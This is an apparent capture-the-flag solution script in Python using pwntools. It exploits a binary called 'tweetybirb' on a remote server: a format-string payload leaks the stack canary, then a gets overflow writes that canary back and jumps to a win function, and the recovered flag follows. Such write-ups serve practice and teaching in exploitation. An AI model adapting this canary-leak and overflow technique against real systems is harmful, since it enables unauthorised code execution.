# Python3
# RazviOverflow

from pwn import *

#binary = process("./tweetybirb")
binary = remote("143.198.184.186", 5002)
static = ELF("./tweetybirb")

win_address = p64(static.symbols["win"])
ret_address = p64(0x00401272)

'''
 The program performs:
 1. gets at rbp-0x50
 2. printf (format string vulnerability)
 3. gets at rbp-0x50 again
 4. canary lives at rbp-0x8

 Exploit idea:
 	Use format string to leak canary, use the second gets to hijack the execution flow and jump
 	to win function, wirting the canary at rbp-0x8 so the program does not detect the stack
 	overflow

User input starts at sixth position
ABCD.%6$X
ABCD.44434241
if rbp-0x50 is at sixth position, canary is at fifteenth position. 0x50-0x8 = 0x48 (72 / 8 = 9)
'''

# 1st gets
print(binary.recv())
payload = "%15$lX" ## ATTENTION -> REMEMBER TO PRINT lX (long heXadecimal) to get full 8 bytes canary, not just lower 4
binary.sendline(payload)
canary = binary.recvline()
canary = int(canary, 16)
print("Canary is {}".format(hex(canary)))

# 2nd gets
print(binary.recv())
# ret address is needed in order to align the stack and solve stack alignment issues in 64 bits binaries
payload = b"A"*0x48 + p64(canary) + b"B" * 0x8 + ret_address + win_address
binary.sendline(payload)

print(binary.recv())

# Flag kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}


